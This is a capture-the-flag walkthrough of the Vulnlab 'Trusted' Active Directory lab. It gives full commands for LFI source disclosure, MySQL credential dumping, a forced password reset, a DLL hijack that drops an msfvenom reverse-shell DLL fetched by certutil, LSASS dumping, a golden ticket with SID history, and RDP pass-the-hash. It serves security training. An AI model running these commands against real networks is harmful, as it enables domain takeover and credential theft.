---
icon: citrus-slice
cover: ../../.gitbook/assets/backiee-304060-landscape.jpg
coverY: 209.9811439346323
---

# VL-TRUSTED

### Overview

Trusted is a two-machine Active Directory chain. The attack surface opens with a PHP-backed web application running on the child domain controller, which exposes a Local File Inclusion vulnerability. From there, the chain runs through MySQL credential harvesting, DACL abuse for lateral movement, DLL hijacking for privilege escalation to Domain Admin on the child domain, and finally inter-realm Kerberos ticket abuse to pivot from `lab.trusted.vl` up to Enterprise Admin on `trusted.vl`. There's a lot to unpack here. Let's get into it.

***

### Reconnaissance

#### Port Scanning

Starting with a broad rustscan to figure out what we're working with across both targets.

```
┌──(sn0x㉿sn0x)-[~/HTB/Trusted]
└─$ rustscan -a 10.10.164.21,10.10.164.22 blah blah
```

```
Nmap scan report for 10.10.164.21
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: trusted.vl0.)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: trusted.vl0.)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: TRUSTED
|   NetBIOS_Domain_Name: TRUSTED
|   NetBIOS_Computer_Name: TRUSTEDDC
|   DNS_Domain_Name: trusted.vl
|   DNS_Computer_Name: trusteddc.trusted.vl

Nmap scan report for 10.10.164.22
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/8.1.6)
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: trusted.vl0.)
443/tcp  open  https         Apache httpd 2.4.53
445/tcp  open  microsoft-ds?
3306/tcp open  mysql         MySQL 5.5.5-10.4.24-MariaDB
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: LAB
|   NetBIOS_Domain_Name: LAB
|   NetBIOS_Computer_Name: LABDC
|   DNS_Domain_Name: lab.trusted.vl
|   DNS_Computer_Name: labdc.lab.trusted.vl
|   DNS_Tree_Name: trusted.vl
```

A few things stand out immediately. Both hosts are running DNS on 53 and Kerberos on 88 — that's the tell-tale signature of a domain controller. The RDP banners are even more explicit: one machine identifies as `TRUSTEDDC` in the `trusted.vl` domain, the other as `LABDC` in `lab.trusted.vl`. The `DNS_Tree_Name: trusted.vl` banner on LABDC confirms the parent-child relationship without any ambiguity.

What's odd about LABDC is why a domain controller is running XAMPP on port 80 and exposing MySQL on 3306 to the network. That's the kind of thing you'd expect on a dev box, not an AD controller. Those two services are going to be our way in.

Adding both to `/etc/hosts`:

```
10.10.164.21 trusted.vl trusteddc.trusted.vl trusteddc
10.10.164.22 lab.trusted.vl labdc.lab.trusted.vl labdc
```

***

#### A Quick Word on the Domain Trust

Before we go further, it's worth understanding the trust architecture we're walking into because it directly shapes our endgame.

`lab.trusted.vl` is a child domain of `trusted.vl`. In Active Directory, a parent-child relationship means there's an implicit, bidirectional, transitive trust between the two domains. Transitive here means if a third child domain existed — say `sales.lab.trusted.vl` — it would automatically inherit the trust chain. A trusts B, B trusts C, therefore A trusts C.

What this means for us is that if we can compromise the child domain (`lab.trusted.vl`) and obtain Domain Admin there, we have a clear escalation path to Enterprise Admin in `trusted.vl` via SID history injection. We'll build an inter-realm golden ticket that embeds the SID of the Enterprise Admins group (`RID 519`) from the parent domain, effectively impersonating a user who has enterprise-wide control. That's the endgame. Now let's build toward it.

***

### Web Enumeration — Port 80 (LABDC)

Hitting `http://labdc/` lands on the default XAMPP page, which isn't interesting by itself, but gives us confirmation of the stack: Apache 2.4.53, OpenSSL 1.1.1n, PHP 8.1.6 on Windows. Worth noting there's no ADCS web enrollment portal here — always worth checking for `http://<host>/certsrv/` but it 404s. Moving on.

Directory bruteforcing with `ffuf` turns up a non-default path pretty quickly:

```
┌──(sn0x㉿sn0x)-[~/HTB/Trusted]
└─$ ffuf -c -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -u "http://labdc/FUZZ" -s
```

```
img
dev          <---
webalizer
phpmyadmin
dashboard
xampp
```

Navigating to `http://labdc/dev/` loads what looks like a law firm website — "Manes Winchester." There's a note near the bottom of the page that mentions the site connects to a local MySQL database for news articles. That's a breadcrumb. If there's a database connection anywhere, there are credentials somewhere in the PHP backend.

Fuzzing for files in `/dev/` specifically:

```
┌──(sn0x㉿sn0x)-[~/HTB/Trusted]
└─$ ffuf -c -w /opt/SecLists/Discovery/Web-Content/raft-medium-files.txt -u "http://labdc/dev/FUZZ" --fc 403 -s
```

```
index.html
contact.html
about.html
db.php
```

`db.php` is exactly the kind of file we want. Navigating directly to it returns a blank page — PHP executed server-side, nothing rendered. But the file exists. Now the question is whether we can read its source.

***

### Local File Inclusion - Reading db.php

Looking at the navigation links in the law firm site, each one loads via a `?view=` parameter — `index.html?view=about.html`, `index.html?view=contact.html`, and so on. That pattern is an immediate red flag. If the server is just including whatever value is passed to `view=`, without sanitization or path restriction, we have LFI.

Quick confirmation — try to traverse out of the web root:

```
http://labdc/dev/index.html?view=../../../../../../windows/win.ini
```

The page loads content from `win.ini`. LFI confirmed. The parameter is taking our input, constructing a file path, and including it with minimal validation.

The obvious next step is to just request `db.php` directly through `view=`:

```
http://labdc/dev/index.html?view=db.php
```

Page renders, but no source code visible — PHP is still being interpreted and executing. We need to read the raw source without the server executing it. This is exactly what PHP stream filters were made for. The `php://filter` wrapper can intercept the file read, apply a transformation (base64 encode in this case), and return the encoded output as a string rather than executing it:

```
http://labdc/dev/index.html?view=php://filter/read=convert.base64-encode/resource=db.php
```

The page spits out a base64-encoded string. Save it and decode:

```
┌──(sn0x㉿sn0x)-[~/HTB/Trusted]
└─$ cat db.php.b64 | base64 -d
```

```php
<?php 
$servername = "localhost";
$username = "root";
$password = "SuperSecureMySQLPassw0rd1337.";

$conn = mysqli_connect($servername, $username, $password);

if (!$conn) {
  die("Connection failed: " . mysqli_connect_error());
}
echo "Connected successfully";
?>
```

MySQL root credentials in plaintext. The LFI was the key that unlocked this — without it we'd have no way to read that PHP source. Now we have direct access to the database.

***

### MySQL Enumeration — Port 3306

```
┌──(sn0x㉿sn0x)-[~/HTB/Trusted]
└─$ mysql -h labdc -u root -p
```

```
Enter password:
Welcome to the MariaDB monitor.
MariaDB [(none)]>
```

Listing databases:

```
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| news               |
| performance_schema |
| phpmyadmin         |
| test               |
+--------------------+
```

The `news` database is the one referenced on the law firm site. Checking its tables:

```
MariaDB [(none)]> use news;
MariaDB [news]> show tables;
+----------------+
| Tables_in_news |
+----------------+
| users          |
+----------------+

MariaDB [news]> describe users;
+--------------+-------------+------+-----+---------+-------+
| Field        | Type        | Null | Key | Default | Extra |
+--------------+-------------+------+-----+---------+-------+
| id           | int(1)      | NO   |     | NULL    |       |
| first_name   | varchar(64) | NO   |     | NULL    |       |
| short_handle | varchar(64) | NO   |     | NULL    |       |
| last_name    | varchar(64) | NO   |     | NULL    |       |
| password     | varchar(64) | NO   |     | NULL    |       |
+--------------+-------------+------+-----+---------+-------+
```

Dumping credentials:

```
MariaDB [news]> select short_handle,password from users;
+--------------+----------------------------------+
| short_handle | password                         |
+--------------+----------------------------------+
| rsmith       | 7e7abb54bbef42f0fbfa3007b368def7 |
| ewalters     | d6e81aeb4df9325b502a02f11043e0ad |
| cpowers      | e3d3eb0f46fe5d75eed8d11d54045a60 |
+--------------+----------------------------------+
```

Three MD5 hashes (no salt — the 32-character fixed-length hex strings are the giveaway). Saving them off and cracking with hashcat. MD5 is mode `0`:

```
┌──(sn0x㉿sn0x)-[~/HTB/Trusted]
└─$ hashcat -m 0 hashes/trusted.txt /opt/rockyou.txt
```

```
7e7abb54bbef42f0fbfa3007b368def7:IHateEric2
```

Only `rsmith` cracked. The other two hashes didn't fall against rockyou — we'll need to find another way to those accounts. But having one valid credential is enough to start enumerating the domain.

***

### Active Directory Enumeration

#### Confirming Credentials and Mapping Users

```
┌──(sn0x㉿sn0x)-[~/HTB/Trusted]
└─$ nxc smb labdc -u rsmith -p IHateEric2
```

```
SMB 10.10.164.22 445 LABDC [+] lab.trusted.vl\rsmith:IHateEric2
```

Valid. Now pull the full user list from LDAP:

```
┌──(sn0x㉿sn0x)-[~/HTB/Trusted]
└─$ nxc ldap labdc -u rsmith -p IHateEric2 --users
```

```
LDAP 10.10.164.22 389 LABDC [+] lab.trusted.vl\rsmith:IHateEric2
LDAP 10.10.164.22 389 LABDC [*] Enumerated 6 domain users: lab.trusted.vl
LDAP 10.10.164.22 389 LABDC   Administrator    2022-09-14 15:07:20
LDAP 10.10.164.22 389 LABDC   rsmith           2022-09-14 18:56:07
LDAP 10.10.164.22 389 LABDC   ewalters         2022-09-18 21:01:41  [BadPW: 1]
LDAP 10.10.164.22 389 LABDC   cpowers          2022-09-14 18:57:50
```

The database usernames map 1:1 to domain accounts. Now let's figure out what permissions these accounts have.

#### Enumerating Group Memberships

```
┌──(sn0x㉿sn0x)-[~/HTB/Trusted]
└─$ nxc smb labdc -u rsmith -p IHateEric2 --groups "Domain Admins"
```

```
SMB 10.10.164.22 445 LABDC [+] lab.trusted.vl\rsmith:IHateEric2
SMB 10.10.164.22 445 LABDC   lab.trusted.vl\cpowers
SMB 10.10.164.22 445 LABDC   lab.trusted.vl\Administrator
```

```
┌──(sn0x㉿sn0x)-[~/HTB/Trusted]
└─$ nxc smb labdc -u rsmith -p IHateEric2 --groups "Remote Management Users"
```

```
SMB 10.10.164.22 445 LABDC   lab.trusted.vl\ewalters
```

```
┌──(sn0x㉿sn0x)-[~/HTB/Trusted]
└─$ nxc smb labdc -u rsmith -p IHateEric2 --groups "Remote Desktop Users"
```

```
SMB 10.10.164.22 445 LABDC   lab.trusted.vl\ewalters
```

So the picture is:

* `cpowers` is a Domain Admin. If we get there, we own the child domain.
* `ewalters` can connect via WinRM and RDP. This is our immediate next hop.
* `rsmith` is what we have now — valid credentials, but no direct access path to the machine.

The route forward is: `rsmith` → `ewalters` → find a way to `cpowers` → escalate to trusted.vl.

#### DACL Enumeration — The Real Win

Group membership gets a lot of attention in AD assessments, but DACLs (Discretionary Access Control Lists) are just as dangerous and far less consistently checked. Every AD object has a DACL that defines who can do what to it. Overly permissive ACEs — especially `ForceChangePassword` — are a common finding in real environments and in well-crafted labs like this.

Let's check what rights `rsmith` has over `ewalters`:

```
┌──(sn0x㉿sn0x)-[~/HTB/Trusted]
└─$ nxc ldap labdc -u rsmith -p IHateEric2 -M daclread -o TARGET=ewalters
```

```
DACLREAD  ACE[24] info
DACLREAD      ACE Type     : ACCESS_ALLOWED_OBJECT_ACE
DACLREAD      Access mask  : ControlAccess
DACLREAD      Object type (GUID) : User-Force-Change-Password (00299570-246d-11d0-a768-00aa006e0529)
DACLREAD      Trustee (SID): rsmith (S-1-5-21-2241985869-2159962460-1278545866-1104)
```

There it is — `rsmith` has `ForceChangePassword` (`User-Force-Change-Password`) rights over `ewalters`. This means we can reset ewalters' password without knowing the current one. We don't need to crack a hash, we don't need to brute force anything. We just reset it and authenticate.

BloodHound would show this as a clean attack path if DNS resolution cooperated, which it didn't in this environment (SRV record lookups for global catalog kept failing). Doesn't matter — we found it manually with `daclread`.

***

### Lateral Movement — rsmith to ewalters

Resetting ewalters' password using `net rpc`:

```
┌──(sn0x㉿sn0x)-[~/HTB/Trusted]
└─$ net rpc password ewalters 'Sn0xSecure123!' -U lab.trusted.vl/rsmith%IHateEric2 -S labdc
```

Clean exit. No output on success, which is expected. Alternatively, `bloodyAD` works just as well and is worth knowing:

```
┌──(sn0x㉿sn0x)-[~/HTB/Trusted]
└─$ bloodyAD --host "labdc.lab.trusted.vl" -d "lab.trusted.vl" -u "rsmith" -p "IHateEric2" set password "ewalters" "Sn0xSecure123!"
```

Both approaches achieve the same outcome — `ewalters` now has a password we control. Connecting via Evil-WinRM:

```
┌──(sn0x㉿sn0x)-[~/HTB/Trusted]
└─$ evil-winrm -u ewalters -p 'Sn0xSecure123!' -i labdc
```

```
Evil-WinRM shell v3.7
*Evil-WinRM* PS C:\Users\ewalters\Documents>
```

We're on the box.

***

### Post-Exploitation on LABDC — Finding the DLL Hijack

#### Initial Enumeration

First flag on the Desktop has a sense of humor:

```
*Evil-WinRM* PS C:\Users\ewalters\Desktop> type User.txt
|\---/|
| o_o |
 \_^_/
These are not the flags you're looking for.
```

Right. Onwards. Poking around the filesystem, something on `C:\` root catches the eye immediately:

```
*Evil-WinRM* PS C:\AVTest> dir

    Directory: C:\AVTest

Mode                LastWriteTime    Length Name
----                -------------    ------ ----
-a----  9/14/2022   4:46 PM        4870584 KasperskyRemovalTool.exe
-a----  9/14/2022   7:05 PM            235 readme.txt
```

```
*Evil-WinRM* PS C:\AVTest> more readme.txt
Since none of the AV Tools we tried here in the lab satisfied our needs it's time to clean them up.
I asked Christine to run them a few times, just to be sure.
```

"Christine" is almost certainly `cpowers` — Christine Powers from the MySQL dump. A Domain Admin is regularly running an executable in a directory we can probably write to. That's a textbook DLL hijack setup.

#### Checking Write Permissions

```
*Evil-WinRM* PS C:\AVTest> icacls .
  Everyone:(OI)(CI)(F)
  NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
  BUILTIN\Administrators:(I)(OI)(CI)(F)
  BUILTIN\Users:(I)(OI)(CI)(RX)
  BUILTIN\Users:(I)(CI)(AD)
  BUILTIN\Users:(I)(CI)(WD)
```

`Everyone` has full control `(F)`. Even without that, `BUILTIN\Users` has `AD` (append data) and `WD` (write data) permissions. Any authenticated user on this box can write files to `C:\AVTest`. This is intentionally misconfigured, and it's exactly what we need.

#### Analyzing KasperskyRemovalTool.exe for DLL Hijack Opportunities

Pull the binary back to a Windows analysis VM and run it under Process Monitor with the following filters:

* Process Name: `KasperskyRemovalTool.exe`
* Result: `NAME NOT FOUND`
* Path ends with `.dll`

Process Monitor will show the DLL search order in real time. When Windows loads a process, it searches for required DLLs in this order:

1. The directory the application was launched from
2. `C:\Windows\System32`
3. `C:\Windows\System`
4. `C:\Windows`
5. Current working directory
6. Directories in `PATH`

Process Monitor shows `KasperskyRemovalToolENU.dll` being searched for in the application's own directory (`C:\AVTest`) with a `NAME NOT FOUND` result. The application looks there first, can't find it, and continues down the search order — presumably finding nothing useful. Since we control `C:\AVTest` and can write there, we can plant our own `KasperskyRemovalToolENU.dll` and have it loaded the next time `cpowers` runs the tool.

#### Generating the Malicious DLL

```
┌──(sn0x㉿sn0x)-[~/HTB/Trusted]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.8.4.11 LPORT=8443 -f dll > KasperskyRemovalToolENU.dll
```

```
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Payload size: 324 bytes
Final size of dll file: 9216 bytes
```

#### Uploading to LABDC

Evil-WinRM's upload function hits constrained language mode (CLM) and fails. AppLocker policy is enforcing CLM, and the approved directories (`%WINDIR%\*`, `%PROGRAMFILES%\*`) all require elevated privileges to write to. CLM via `System32` path tricks don't work here either.

Checking AppLocker policy:

```
*Evil-WinRM* PS C:\Windows> Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections
```

```
PathConditions : {\%WINDIR\%\Installer\*}
PathConditions : {\%PROGRAMFILES\%\*}
PathConditions : {\%WINDIR\%\*}
```

PowerShell upload blocked. Falling back to `certutil`, which doesn't care about CLM and will happily download files from a remote URL:

```
┌──(sn0x㉿sn0x)-[~/HTB/Trusted]
└─$ python3 -m http.server 8000
```

```
*Evil-WinRM* PS C:\AVTest> certutil -urlcache -f http://10.8.4.11:8000/KasperskyRemovalToolENU.dll KasperskyRemovalToolENU.dll
****  Online  ****
CertUtil: -URLCache command completed successfully.
```

Start the listener and wait for `cpowers` to run the tool:

```
┌──(sn0x㉿sn0x)-[~/HTB/Trusted]
└─$ nc -lvnp 8443
```

```
Ncat: Listening on 0.0.0.0:8443
Ncat: Connection from 10.10.164.22:55474.
Microsoft Windows [Version 10.0.20348.887]

C:\Windows\system32> set u
USERDNSDOMAIN=LAB.TRUSTED.VL
USERDOMAIN=LAB
USERNAME=cpowers
```

We're running as `cpowers` — Domain Admin in `lab.trusted.vl`.

```
C:\Users\Administrator\Desktop> type User.txt
VL{349e***********************5802}
```

Child domain compromised.

***

### Privilege Escalation — Dumping LSASS for cpowers NTLM Hash

To pivot to `trusted.vl`, we need either a plaintext password or the NTLM hash for `cpowers` or the domain `krbtgt` account. LSASS is where that lives.

A few approaches were tested for dumping LSASS. Diskshadow + ntdsutil.exe for `ntds.dit` extraction didn't cooperate. `rdrleakdiag.exe` and `comsvcs.dll` (`MiniDump`) created the dump file path but never wrote the actual process memory. These may have been blocked or the shell context was too restricted.

ProcDump from Sysinternals worked cleanly:

```
C:\Temp> certutil -urlcache -f http://10.8.4.11:8000/procdump.exe procdump.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.

C:\Temp> procdump.exe -accepteula -ma lsass.exe lsass.bin
[05:06:45] Dump 1 initiated: C:\Temp\lsass.bin.dmp
[05:06:48] Dump 1 complete: 140 MB written in 3.1 seconds
```

Getting the dump back to the attack machine. Evil-WinRM download kept failing (CLM-related again), so standing up an SMB server:

```
┌──(sn0x㉿sn0x)-[~/HTB/Trusted]
└─$ smbserver.py -smb2support SHARE . -username TestUser -password TestPassword
```

```
*Evil-WinRM* PS C:\Temp> net use Z: \\10.8.4.11\SHARE /user:TestUser TestPassword
The command completed successfully.

*Evil-WinRM* PS C:\Temp> copy "C:/Temp/lsass.bin.dmp" Z:
```

Parsing the dump:

```
┌──(sn0x㉿sn0x)-[~/HTB/Trusted]
└─$ pypykatz lsa minidump lsass.bin.dmp
```

```
== LogonSession ==
username cpowers
domainname LAB
logon_server LABDC
        == MSV ==
                Username: cpowers
                Domain: LAB
                NT: 322d************************3c43
```

NTLM hash for `cpowers` extracted. As a bonus, we can also DCSync the entire child domain with this:

```
┌──(sn0x㉿sn0x)-[~/HTB/Trusted]
└─$ secretsdump -hashes :322d************************3c43 lab/cpowers@labdc.lab.trusted.vl
```

```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:c7a03c565c68c6fac5f8913fab576ebd:::
lab.trusted.vl\rsmith:1104:...
lab.trusted.vl\ewalters:1106:...
lab.trusted.vl\cpowers:1107:...
LABDC$:1000:...
TRUSTED$:1103:aad3b435b51404eeaad3b435b51404ee:b6ae************************757b:::
```

We now have the `krbtgt` hash for `lab.trusted.vl`. That's everything we need for the inter-realm ticket.

***

### Escalating to Enterprise Admin — Child to Parent Domain

#### The Technique: SID History Injection via Inter-Realm Golden Ticket

When Kerberos handles cross-domain authentication in a trust relationship, the child domain's KDC issues an inter-realm TGT signed with the inter-realm trust key. The parent domain's KDC trusts this because it knows the shared trust secret.

The attack works by forging this inter-realm TGT ourselves, using the child domain's `krbtgt` hash (which we have from the DCSync). Critically, we embed the SID of the `Enterprise Admins` group from the parent domain (`S-1-5-21-3576695518-347000760-3731839591-519`) in the `sIDHistory` attribute of the ticket. When the parent domain's KDC evaluates this ticket, it sees the Enterprise Admins SID in the SID history and grants us those privileges. The protection that's supposed to prevent this (SID filtering) is disabled by default on parent-child trusts within the same forest.

#### Manual Method (Mimikatz)

If you want to do this manually with Mimikatz inside the shell:

```
mimikatz # privilege::debug
mimikatz # lsadump::trust /patch
```

Collect:

* `LAB.TRUSTED.VL SID:` `S-1-5-21-2241985869-2159962460-1278545866`
* `TRUSTED.VL SID:` `S-1-5-21-3576695518-347000760-3731839591`
* Enterprise Admins SID (parent SID + `-519`): `S-1-5-21-3576695518-347000760-3731839591-519`
* `krbtgt` hash for lab.trusted.vl: `c7a03c565c68c6fac5f8913fab576ebd`

Then forge the golden ticket:

```
mimikatz # kerberos::golden /user:Administrator /domain:lab.trusted.vl /sid:S-1-5-21-2241985869-2159962460-1278545866 /sids:S-1-5-21-3576695518-347000760-3731839591-519 /rc4:c7a03c565c68c6fac5f8913fab576ebd /service:krbtgt /target:trusted.vl /ticket:trustkey.kirbi ptt
```

Then DCSync against the parent to get Administrator's NTLM:

```
mimikatz # lsadump::dcsync /domain:trusted.vl /dc:trusteddc.trusted.vl /all
```

#### Automated Method (raiseChild.py)

Impacket's `raiseChild.py` handles the entire child-to-parent escalation chain automatically — it identifies both domain SIDs, grabs the trust keys and krbtgt hashes, forges the inter-realm ticket, and directly extracts the parent domain Administrator credentials:

```
┌──(sn0x㉿sn0x)-[~/HTB/Trusted]
└─$ python3 raiseChild.py lab.trusted.vl/cpowers -hashes :322d************************3c43
```

```
[*] Raising child domain lab.trusted.vl
[*] Forest FQDN is: trusted.vl
[*] trusted.vl Enterprise Admin SID is: S-1-5-21-3576695518-347000760-3731839591-519
[*] Getting credentials for lab.trusted.vl
lab.trusted.vl/krbtgt:502:...c7a03c565c68c6fac5f8913fab576ebd:::
[*] Getting credentials for trusted.vl
trusted.vl/krbtgt:502:...d943************************fa2d:::
[*] Target User account name is Administrator
trusted.vl/Administrator:500:...15db************************72ef:::
trusted.vl/Administrator:aes256-cts-hmac-sha1-96s:d75e...
```

We now have the NTLM hash for `Administrator` in `trusted.vl`.

```
┌──(sn0x㉿sn0x)-[~/HTB/Trusted]
└─$ evil-winrm -u Administrator -H 15db************************72ef -i trusteddc.trusted.vl
```

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami; hostname
trusted\administrator
trusteddc
```

***

### Reading the Root Flag — Bypassing EFS

Attempting to read the flag:

```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
Access to the path 'C:\Users\Administrator\Desktop\root.txt' is denied.
```

Interesting. We're Administrator and we can't read our own file. Let's check why:

```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cipher.exe

 Listing C:\Users\Administrator\Desktop\
 New files added to this directory will be encrypted.

E root.txt
```

The `E` prefix means the file is encrypted with EFS (Encrypting File System). EFS encryption is tied to the user's certificate and private key — the NTLM hash gives us authentication rights but not the EFS decryption key that lives in the user's profile. Even as that user over WinRM, the EFS key isn't available in this session context.

The solution is RDP. But by default, Restricted Admin mode is disabled, which means xfreerdp's pass-the-hash won't work — RDP without Restricted Admin will demand a password, and we only have a hash.

Enabling Restricted Admin mode via the registry (requires our current Admin WinRM session):

```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /d 0 /t REG_DWORD
The operation completed successfully.
```

Setting the value to `0` enables Restricted Admin mode. In this mode, the client authenticates locally and sends a Kerberos or NTLM token rather than forwarding credentials to the remote host — which is what makes pass-the-hash work over RDP.

```
┌──(sn0x㉿sn0x)-[~/HTB/Trusted]
└─$ xfreerdp /d:trusted.vl /u:Administrator /pth:15db************************72ef /v:trusteddc.trusted.vl
```

RDP session opens with full desktop context. The EFS key is now available. `root.txt` opens cleanly.

> **Note**: If this were a real engagement, that `DisableRestrictedAdmin` registry key must be removed during cleanup. The key doesn't exist by default, and leaving it creates a persistent attack vector for future pass-the-hash RDP attacks against this machine.

***

### Attack Flow

```
[LFI on labdc/dev/index.html?view=]
        |
        | php://filter base64 bypass
        v
[db.php source leaked → MySQL root credentials]
        |
        | mysql -h labdc -u root
        v
[news.users table → MD5 hashes → hashcat → rsmith:IHateEric2]
        |
        | nxc ldap / daclread
        v
[rsmith has ForceChangePassword over ewalters]
        |
        | net rpc password / bloodyAD
        v
[ewalters password reset → evil-winrm to labdc]
        |
        | C:\AVTest analysis → KasperskyRemovalTool DLL hijack
        v
[KasperskyRemovalToolENU.dll planted → cpowers runs tool]
        |
        | msfvenom reverse shell DLL
        v
[Shell as cpowers (Domain Admin, lab.trusted.vl)]
        |
        | procdump → pypykatz / secretsdump
        v
[cpowers NTLM hash + lab krbtgt hash extracted]
        |
        | raiseChild.py / Mimikatz golden ticket + SID history injection
        v
[trusted.vl Administrator NTLM hash]
        |
        | evil-winrm → enable Restricted Admin → xfreerdp PTH
        v
[SYSTEM on trusteddc → EFS bypass via RDP → root.txt]
```

***

<figure><img src="../../.gitbook/assets/complete.gif" alt=""><figcaption></figcaption></figure>
